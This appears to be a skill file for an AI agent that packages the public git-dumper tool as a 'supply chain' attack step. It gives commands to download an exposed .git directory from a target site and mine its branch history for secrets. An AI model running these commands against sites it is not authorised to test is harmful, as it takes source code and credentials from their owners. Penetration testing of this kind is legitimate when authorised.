---
name: git-dumper-repo
description: "git-dumper recovers exposed .git repositories without directory listing. Signals: supply chain, CI/CD, download and restore repository, concurrency, aggressive scan mode."
zh-signals: "git-dumper: 无目录列表的 .git 还原。信号:供应链,cicd,下载并还原仓库,并发,强扫模式。"
when-to-use: >-
  Use when a .git repository is exposed without directory listing and you need
  to download and restore it using concurrency and aggressive scan modes.
---

# git-dumper

- Attack Category: C12 Supply Chain and CI/CD Attacks
- Upstream Repository: https://github.com/arthaud/git-dumper
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install git-dumper
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `git-dumper https://t.com/.git/ ./repo` | Download and restore the repository |
| `--jobs 10` | Concurrency |
| `--brute` | Aggressive scan mode |

## Attack Scenario Playbook

### Restoring a .git repository without directory listing

```bash
git-dumper --jobs 20 https://target.com/.git/ leaked
cd leaked && git log --all --oneline  # Mine all branch history for secrets
```

## Notes

Guesses .git object filenames intelligently, no directory listing required; complements dvcs-ripper.
